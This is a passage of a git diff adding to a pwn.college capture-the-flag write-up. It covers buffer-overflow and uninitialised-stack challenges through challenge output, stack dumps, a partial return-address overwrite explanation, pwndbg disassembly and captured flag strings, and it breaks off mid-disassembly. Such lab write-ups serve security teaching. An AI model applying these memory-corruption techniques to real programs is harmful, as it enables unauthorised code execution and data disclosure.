@@ -6465,7 +6465,7 @@ while True:
 ```
 
 ```
-hacker@program-security~recursive-ruin-hard:/$ python ~/2_script.py 
+hacker@program-security~recursive-ruin-hard:/$ python ~/script.py 
 !!! FLAG FOUND ON ATTEMPT 11 !!!
 
 You said: AAAAAAAAAAAAAAAAAAAAAAAA
@@ -6479,5 +6479,1277 @@ pwn.college{4wIXepUmd8EUH6XrDzc8BNIhTJ1.0lMxMDL4ITM0EzW}
 ## Lingering Leftover (Easy)
 
 ```
+hacker@program-security~lingering-leftover-easy:/$ /challenge/lingering-leftover-easy 
+###
+### Welcome to /challenge/lingering-leftover-easy!
+###
 
+This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?
+
+The flag was read into address 0x7fff5f3295f6.
+
+The challenge() function has just been launched!
+However... An important initialization step was missed.
+Use this to your advantage!
+
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff5f3294c0 (rsp+0x0000) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007fff5f3294c8 (rsp+0x0008) | 48 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a848 |
+| 0x00007fff5f3294d0 (rsp+0x0010) | 38 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a838 |
+| 0x00007fff5f3294d8 (rsp+0x0018) | 00 6d fd bf 01 00 00 00 | 0x00000001bffd6d00 |
+| 0x00007fff5f3294e0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3294e8 (rsp+0x0028) | f6 95 32 5f ff 7f 00 00 | 0x00007fff5f3295f6 |
+| 0x00007fff5f3294f0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3294f8 (rsp+0x0038) | 00 95 32 5f ff 7f 00 00 | 0x00007fff5f329500 |
+| 0x00007fff5f329500 (rsp+0x0040) | 76 00 00 00 00 00 00 00 | 0x0000000000000076 |
+| 0x00007fff5f329508 (rsp+0x0048) | 33 00 00 00 00 00 00 00 | 0x0000000000000033 |
+| 0x00007fff5f329510 (rsp+0x0050) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329518 (rsp+0x0058) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f329520 (rsp+0x0060) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329528 (rsp+0x0068) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
+| 0x00007fff5f329530 (rsp+0x0070) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f329538 (rsp+0x0078) | a0 b4 d9 58 7a 73 00 00 | 0x0000737a58d9b4a0 |
+| 0x00007fff5f329540 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f329548 (rsp+0x0088) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
+| 0x00007fff5f329550 (rsp+0x0090) | 75 00 00 00 00 00 00 00 | 0x0000000000000075 |
+| 0x00007fff5f329558 (rsp+0x0098) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329560 (rsp+0x00a0) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
+| 0x00007fff5f329568 (rsp+0x00a8) | 9a 65 c3 58 7a 73 00 00 | 0x0000737a58c3659a |
+| 0x00007fff5f329570 (rsp+0x00b0) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f329578 (rsp+0x00b8) | 00 97 32 5f ff 7f 00 00 | 0x00007fff5f329700 |
+| 0x00007fff5f329580 (rsp+0x00c0) | e0 b1 1f e6 c6 60 00 00 | 0x000060c6e61fb1e0 |
+| 0x00007fff5f329588 (rsp+0x00c8) | 30 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a830 |
+| 0x00007fff5f329590 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f329598 (rsp+0x00d8) | ea c5 1f e6 c6 60 00 00 | 0x000060c6e61fc5ea |
+| 0x00007fff5f3295a0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295a8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295b0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295b8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295c0 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295c8 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295d0 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295d8 (rsp+0x0118) | 93 11 dc 58 7a 73 00 00 | 0x0000737a58dc1193 |
+| 0x00007fff5f3295e0 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
+| 0x00007fff5f3295e8 (rsp+0x0128) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
+| 0x00007fff5f3295f0 (rsp+0x0130) | 00 40 da 58 7a 73 70 77 | 0x7770737a58da4000 |
+| 0x00007fff5f3295f8 (rsp+0x0138) | 6e 2e 63 6f 6c 6c 65 67 | 0x67656c6c6f632e6e |
+| 0x00007fff5f329600 (rsp+0x0140) | 65 7b 34 6d 6f 7a 45 4c | 0x4c457a6f6d347b65 |
+| 0x00007fff5f329608 (rsp+0x0148) | 34 6a 30 5a 35 53 38 69 | 0x693853355a306a34 |
+| 0x00007fff5f329610 (rsp+0x0150) | 6b 30 38 42 7a 6e 72 52 | 0x52726e7a4238306b |
+| 0x00007fff5f329618 (rsp+0x0158) | 61 71 39 66 57 2e 30 31 | 0x31302e5766397161 |
+| 0x00007fff5f329620 (rsp+0x0160) | 4d 78 4d 44 4c 34 49 54 | 0x5449344c444d784d |
+| 0x00007fff5f329628 (rsp+0x0168) | 4d 30 45 7a 57 7d 0a 00 | 0x000a7d577a45304d |
+| 0x00007fff5f329630 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007fff5f329638 (rsp+0x0178) | 10 97 32 5f ff 7f 00 00 | 0x00007fff5f329710 |
+| 0x00007fff5f329640 (rsp+0x0180) | 50 96 32 5f ff 7f 00 00 | 0x00007fff5f329650 |
+| 0x00007fff5f329648 (rsp+0x0188) | 8d 0e c4 58 7a 73 00 00 | 0x0000737a58c40e8d |
+| 0x00007fff5f329650 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007fff5f329658 (rsp+0x0198) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329660 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fff5f329668 (rsp+0x01a8) | 23 f7 d9 58 7a 73 00 00 | 0x0000737a58d9f723 |
+| 0x00007fff5f329670 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329678 (rsp+0x01b8) | 51 29 c4 58 7a 73 00 00 | 0x0000737a58c42951 |
+| 0x00007fff5f329680 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329688 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f329690 (rsp+0x01d0) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329698 (rsp+0x01d8) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f3296a0 (rsp+0x01e0) | 40 55 da 58 7a 73 00 00 | 0x0000737a58da5540 |
+| 0x00007fff5f3296a8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3296b0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3296b8 (rsp+0x01f8) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
+| 0x00007fff5f3296c0 (rsp+0x0200) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f3296c8 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f3296d0 (rsp+0x0210) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f3296d8 (rsp+0x0218) | 02 83 c3 58 7a 73 00 00 | 0x0000737a58c38302 |
+| 0x00007fff5f3296e0 (rsp+0x0220) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f3296e8 (rsp+0x0228) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f3296f0 (rsp+0x0230) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
+| 0x00007fff5f3296f8 (rsp+0x0238) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
+| 0x00007fff5f329700 (rsp+0x0240) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
+| 0x00007fff5f329708 (rsp+0x0248) | 98 ce 1f e6 c6 60 00 00 | 0x000060c6e61fce98 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7fff5f3294c0, and our base pointer points to 0x7fff5f329700.
+This means that we have (decimal) 74 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 592 bytes.
+The input buffer begins at 0x7fff5f329500, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 490 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win_authed() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7fff5f329708, 520 bytes after the start of your input buffer.
+That means that you will need to input at least 528 bytes (490 to fill the buffer,
+30 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+Because the binary is position independent, you cannot know
+exactly where the win_authed() function is located.
+This means that it is not clear what should be written into the return address.
+
+Payload size: 2
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7fff5f329500 (the start of the input buffer)
+right up to (but not including) 0x7fff5f329502 (which is -488 bytes beyond the end of the buffer).
+Of these, you will overwrite -518 bytes into the return address.
+If that number is greater than 8, you will overwrite the entire return address.
+
+Overwriting the entire return address is fine when we know
+the whole address, but here, we only really know the last three nibbles.
+These nibbles never change, because pages are aligned to 0x1000.
+This gives us a workaround: we can overwrite the least significant byte
+of the saved return address, which we can know from debugging the binary,
+to retarget the return to main to any instruction that shares the other 7 bytes.
+Since that last byte will be constant between executions (due to page alignment),
+this will always work.
+If the address we want to redirect execution to is a bit farther away from
+the saved return address, and we need to write two bytes, then one of those
+nibbles (the fourth least-significant one) will be a guess, and it will be
+incorrect 15 of 16 times.
+This is okay: we can just run our exploit a few times until it works
+(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
+One caveat in this challenge is that the win_authed() function must first auth:
+it only lets you win if you provide it with the argument 0x1337.
+Speifically, the win_authed() function looks something like:
+    void win_authed(int token)
+    {
+      if (token != 0x1337) return;
+      puts("You win! Here is your flag: ");
+      sendfile(1, open("/flag", 0), 0, 256);
+      puts("");
+    }
+
+So how do you pass the check? There *is* a way, and we will cover it later,
+but for now, we will simply bypass it! You can overwrite the return address
+with *any* value (as long as it points to executable code), not just the start
+of functions. Let's overwrite past the token check in win!
+
+To do this, we will need to analyze the program with objdump, identify where
+the check is in the win_authed() function, find the address right after the check,
+and write that address over the saved return address.
+
+Go ahead and find this address now. When you're ready, input a buffer overflow
+that will overwrite the saved return address (at 0x7fff5f329708, 520 bytes into the buffer)
+with the correct value.
+
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff5f3294c0 (rsp+0x0000) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007fff5f3294c8 (rsp+0x0008) | 48 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a848 |
+| 0x00007fff5f3294d0 (rsp+0x0010) | 38 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a838 |
+| 0x00007fff5f3294d8 (rsp+0x0018) | 00 6d fd bf 01 00 00 00 | 0x00000001bffd6d00 |
+| 0x00007fff5f3294e0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3294e8 (rsp+0x0028) | f6 95 32 5f 02 00 00 00 | 0x000000025f3295f6 |
+| 0x00007fff5f3294f0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
+| 0x00007fff5f3294f8 (rsp+0x0038) | 00 95 32 5f ff 7f 00 00 | 0x00007fff5f329500 |
+| 0x00007fff5f329500 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007fff5f329508 (rsp+0x0048) | 33 00 00 00 00 00 00 00 | 0x0000000000000033 |
+| 0x00007fff5f329510 (rsp+0x0050) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329518 (rsp+0x0058) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f329520 (rsp+0x0060) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329528 (rsp+0x0068) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
+| 0x00007fff5f329530 (rsp+0x0070) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f329538 (rsp+0x0078) | a0 b4 d9 58 7a 73 00 00 | 0x0000737a58d9b4a0 |
+| 0x00007fff5f329540 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f329548 (rsp+0x0088) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
+| 0x00007fff5f329550 (rsp+0x0090) | 75 00 00 00 00 00 00 00 | 0x0000000000000075 |
+| 0x00007fff5f329558 (rsp+0x0098) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329560 (rsp+0x00a0) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
+| 0x00007fff5f329568 (rsp+0x00a8) | 9a 65 c3 58 7a 73 00 00 | 0x0000737a58c3659a |
+| 0x00007fff5f329570 (rsp+0x00b0) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f329578 (rsp+0x00b8) | 00 97 32 5f ff 7f 00 00 | 0x00007fff5f329700 |
+| 0x00007fff5f329580 (rsp+0x00c0) | e0 b1 1f e6 c6 60 00 00 | 0x000060c6e61fb1e0 |
+| 0x00007fff5f329588 (rsp+0x00c8) | 30 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a830 |
+| 0x00007fff5f329590 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f329598 (rsp+0x00d8) | ea c5 1f e6 c6 60 00 00 | 0x000060c6e61fc5ea |
+| 0x00007fff5f3295a0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295a8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295b0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295b8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295c0 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295c8 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295d0 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3295d8 (rsp+0x0118) | 93 11 dc 58 7a 73 00 00 | 0x0000737a58dc1193 |
+| 0x00007fff5f3295e0 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
+| 0x00007fff5f3295e8 (rsp+0x0128) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
+| 0x00007fff5f3295f0 (rsp+0x0130) | 00 40 da 58 7a 73 70 77 | 0x7770737a58da4000 |
+| 0x00007fff5f3295f8 (rsp+0x0138) | 6e 2e 63 6f 6c 6c 65 67 | 0x67656c6c6f632e6e |
+| 0x00007fff5f329600 (rsp+0x0140) | 65 7b 34 6d 6f 7a 45 4c | 0x4c457a6f6d347b65 |
+| 0x00007fff5f329608 (rsp+0x0148) | 34 6a 30 5a 35 53 38 69 | 0x693853355a306a34 |
+| 0x00007fff5f329610 (rsp+0x0150) | 6b 30 38 42 7a 6e 72 52 | 0x52726e7a4238306b |
+| 0x00007fff5f329618 (rsp+0x0158) | 61 71 39 66 57 2e 30 31 | 0x31302e5766397161 |
+| 0x00007fff5f329620 (rsp+0x0160) | 4d 78 4d 44 4c 34 49 54 | 0x5449344c444d784d |
+| 0x00007fff5f329628 (rsp+0x0168) | 4d 30 45 7a 57 7d 0a 00 | 0x000a7d577a45304d |
+| 0x00007fff5f329630 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007fff5f329638 (rsp+0x0178) | 10 97 32 5f ff 7f 00 00 | 0x00007fff5f329710 |
+| 0x00007fff5f329640 (rsp+0x0180) | 50 96 32 5f ff 7f 00 00 | 0x00007fff5f329650 |
+| 0x00007fff5f329648 (rsp+0x0188) | 8d 0e c4 58 7a 73 00 00 | 0x0000737a58c40e8d |
+| 0x00007fff5f329650 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007fff5f329658 (rsp+0x0198) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329660 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fff5f329668 (rsp+0x01a8) | 23 f7 d9 58 7a 73 00 00 | 0x0000737a58d9f723 |
+| 0x00007fff5f329670 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329678 (rsp+0x01b8) | 51 29 c4 58 7a 73 00 00 | 0x0000737a58c42951 |
+| 0x00007fff5f329680 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff5f329688 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f329690 (rsp+0x01d0) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f329698 (rsp+0x01d8) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f3296a0 (rsp+0x01e0) | 40 55 da 58 7a 73 00 00 | 0x0000737a58da5540 |
+| 0x00007fff5f3296a8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3296b0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff5f3296b8 (rsp+0x01f8) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
+| 0x00007fff5f3296c0 (rsp+0x0200) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
+| 0x00007fff5f3296c8 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007fff5f3296d0 (rsp+0x0210) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
+| 0x00007fff5f3296d8 (rsp+0x0218) | 02 83 c3 58 7a 73 00 00 | 0x0000737a58c38302 |
+| 0x00007fff5f3296e0 (rsp+0x0220) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f3296e8 (rsp+0x0228) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
+| 0x00007fff5f3296f0 (rsp+0x0230) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
+| 0x00007fff5f3296f8 (rsp+0x0238) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
+| 0x00007fff5f329700 (rsp+0x0240) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
+| 0x00007fff5f329708 (rsp+0x0248) | 98 ce 1f e6 c6 60 00 00 | 0x000060c6e61fce98 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff5f329500
+- the saved frame pointer (of main) is at 0x7fff5f329700
+- the saved return address (previously to main) is at 0x7fff5f329708
+- the saved return address is now pointing to 0x60c6e61fce98.
+- the canary is stored at 0x7fff5f3296f8.
+- the canary value is now 0xb8fd897dbffd6d00.
+- the address of win_authed() is 0x60c6e61fc452.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+Since the stack is not cleared from the last function call, the artifacts, including the flag are still there in the stack.
+
+Let's see which functions this binary has.
+
+### Binary Anaysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001100  __cxa_finalize@plt
+0x0000000000001110  putchar@plt
+0x0000000000001120  __errno_location@plt
+0x0000000000001130  puts@plt
+0x0000000000001140  write@plt
+0x0000000000001150  __stack_chk_fail@plt
+0x0000000000001160  printf@plt
+0x0000000000001170  geteuid@plt
+0x0000000000001180  read@plt
+0x0000000000001190  setvbuf@plt
+0x00000000000011a0  open@plt
+0x00000000000011b0  __isoc99_scanf@plt
+0x00000000000011c0  exit@plt
+0x00000000000011d0  strerror@plt
+0x00000000000011e0  _start
+0x0000000000001210  deregister_tm_clones
+0x0000000000001240  register_tm_clones
+0x0000000000001280  __do_global_dtors_aux
+0x00000000000012c0  frame_dummy
+0x00000000000012c9  DUMP_STACK
+0x00000000000014cc  bin_padding
+0x0000000000002452  win_authed
+0x000000000000256f  verify_flag
+0x0000000000002601  challenge
+0x0000000000002db9  main
+0x0000000000002ec0  __libc_csu_init
+0x0000000000002f30  __libc_csu_fini
+0x0000000000002f38  _fini
+```
+
+The `verify_flag()` function is new.
+
+#### `verify_flag()`
+
+```
+pwndbg> disassemble verify_flag 
+Dump of assembler code for function verify_flag:
+   0x000000000000256f <+0>:     endbr64
+   0x0000000000002573 <+4>:     push   rbp
+   0x0000000000002574 <+5>:     mov    rbp,rsp
+   0x0000000000002577 <+8>:     sub    rsp,0x160
+   0x000000000000257e <+15>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000002587 <+24>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000258b <+28>:    xor    eax,eax
+   0x000000000000258d <+30>:    mov    esi,0x0
+   0x0000000000002592 <+35>:    lea    rdi,[rip+0xb73]        # 0x310c
+   0x0000000000002599 <+42>:    mov    eax,0x0
+   0x000000000000259e <+47>:    call   0x11a0 <open@plt>
+   0x00000000000025a3 <+52>:    mov    ecx,eax
+   0x00000000000025a5 <+54>:    lea    rax,[rbp-0x160]
+   0x00000000000025ac <+61>:    add    rax,0x56
+   0x00000000000025b0 <+65>:    mov    edx,0x100
+   0x00000000000025b5 <+70>:    mov    rsi,rax
+   0x00000000000025b8 <+73>:    mov    edi,ecx
+   0x00000000000025ba <+75>:    call   0x1180 <read@plt>
+   0x00000000000025bf <+80>:    lea    rdi,[rip+0xc32]        # 0x31f8
+   0x00000000000025c6 <+87>:    call   0x1130 <puts@plt>
+   0x00000000000025cb <+92>:    lea    rax,[rbp-0x160]
+   0x00000000000025d2 <+99>:    add    rax,0x56
+   0x00000000000025d6 <+103>:   mov    rsi,rax
+   0x00000000000025d9 <+106>:   lea    rdi,[rip+0xc90]        # 0x3270
+   0x00000000000025e0 <+113>:   mov    eax,0x0
+   0x00000000000025e5 <+118>:   call   0x1160 <printf@plt>
+   0x00000000000025ea <+123>:   nop
+   0x00000000000025eb <+124>:   mov    rdx,QWORD PTR [rbp-0x8]
+   0x00000000000025ef <+128>:   xor    rdx,QWORD PTR fs:0x28
+   0x00000000000025f8 <+137>:   je     0x25ff <verify_flag+144>
+   0x00000000000025fa <+139>:   call   0x1150 <__stack_chk_fail@plt>
+   0x00000000000025ff <+144>:   leave
+   0x0000000000002600 <+145>:   ret
+End of assembler dump.
+```
+
+We can see that this function reads the flag at `rbp-0x160+0x56`.
+Let's set a breakpoint at `werify_flag+75` to see where the flag is read.
+
+```
+pwndbg> break *(verify_flag+75)
+Breakpoint 1 at 0x25ba
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000002601 <+0>:     endbr64
+   0x0000000000002605 <+4>:     push   rbp
+   0x0000000000002606 <+5>:     mov    rbp,rsp
+   0x0000000000002609 <+8>:     sub    rsp,0x240
+   0x0000000000002610 <+15>:    mov    DWORD PTR [rbp-0x224],edi
+   0x0000000000002616 <+21>:    mov    QWORD PTR [rbp-0x230],rsi
+   0x000000000000261d <+28>:    mov    QWORD PTR [rbp-0x238],rdx
+   0x0000000000002624 <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x000000000000262d <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000002631 <+48>:    xor    eax,eax
+   0x0000000000002633 <+50>:    lea    rax,[rbp-0x200]
+   0x000000000000263a <+57>:    mov    QWORD PTR [rbp-0x208],rax
+   0x0000000000002641 <+64>:    mov    QWORD PTR [rbp-0x210],0x0
+   0x000000000000264c <+75>:    lea    rdi,[rip+0xc45]        # 0x3298
+   0x0000000000002653 <+82>:    call   0x1130 <puts@plt>
+   0x0000000000002658 <+87>:    lea    rdi,[rip+0xc71]        # 0x32d0
+   0x000000000000265f <+94>:    call   0x1130 <puts@plt>
+   0x0000000000002664 <+99>:    lea    rdi,[rip+0xc9d]        # 0x3308
+   0x000000000000266b <+106>:   call   0x1130 <puts@plt>
+   0x0000000000002670 <+111>:   lea    rdi,[rip+0xcad]        # 0x3324
+   0x0000000000002677 <+118>:   call   0x1130 <puts@plt>
+   0x000000000000267c <+123>:   mov    rax,rsp
+   0x000000000000267f <+126>:   mov    QWORD PTR [rip+0x3b12],rax        # 0x6198 <sp_>
+   0x0000000000002686 <+133>:   mov    rax,rbp
+   0x0000000000002689 <+136>:   mov    QWORD PTR [rip+0x3ae8],rax        # 0x6178 <bp_>
+   0x0000000000002690 <+143>:   mov    rdx,QWORD PTR [rip+0x3ae1]        # 0x6178 <bp_>
+   0x0000000000002697 <+150>:   mov    rax,QWORD PTR [rip+0x3afa]        # 0x6198 <sp_>
+   0x000000000000269e <+157>:   sub    rdx,rax
+   0x00000000000026a1 <+160>:   mov    rax,rdx
+   0x00000000000026a4 <+163>:   shr    rax,0x3
+   0x00000000000026a8 <+167>:   add    rax,0x2
+   0x00000000000026ac <+171>:   mov    QWORD PTR [rip+0x3ad5],rax        # 0x6188 <sz_>
+   0x00000000000026b3 <+178>:   mov    rax,QWORD PTR [rip+0x3abe]        # 0x6178 <bp_>
+   0x00000000000026ba <+185>:   add    rax,0x8
+   0x00000000000026be <+189>:   mov    QWORD PTR [rip+0x3acb],rax        # 0x6190 <rp_>
+   0x00000000000026c5 <+196>:   lea    rdi,[rip+0xc5c]        # 0x3328
+   0x00000000000026cc <+203>:   call   0x1130 <puts@plt>
+   0x00000000000026d1 <+208>:   mov    rdx,QWORD PTR [rip+0x3ab0]        # 0x6188 <sz_>
+   0x00000000000026d8 <+215>:   mov    rax,QWORD PTR [rip+0x3ab9]        # 0x6198 <sp_>
+   0x00000000000026df <+222>:   mov    rsi,rdx
+   0x00000000000026e2 <+225>:   mov    rdi,rax
+   0x00000000000026e5 <+228>:   call   0x12c9 <DUMP_STACK>
+   0x00000000000026ea <+233>:   mov    rdx,QWORD PTR [rip+0x3a87]        # 0x6178 <bp_>
+   0x00000000000026f1 <+240>:   mov    rax,QWORD PTR [rip+0x3aa0]        # 0x6198 <sp_>
+   0x00000000000026f8 <+247>:   mov    rsi,rax
+   0x00000000000026fb <+250>:   lea    rdi,[rip+0xc6e]        # 0x3370
+   0x0000000000002702 <+257>:   mov    eax,0x0
+   0x0000000000002707 <+262>:   call   0x1160 <printf@plt>
+   0x000000000000270c <+267>:   mov    rax,QWORD PTR [rip+0x3a75]        # 0x6188 <sz_>
+   0x0000000000002713 <+274>:   mov    rsi,rax
+   0x0000000000002716 <+277>:   lea    rdi,[rip+0xc9b]        # 0x33b8
+   0x000000000000271d <+284>:   mov    eax,0x0
+   0x0000000000002722 <+289>:   call   0x1160 <printf@plt>
+   0x0000000000002727 <+294>:   lea    rdi,[rip+0xcd2]        # 0x3400
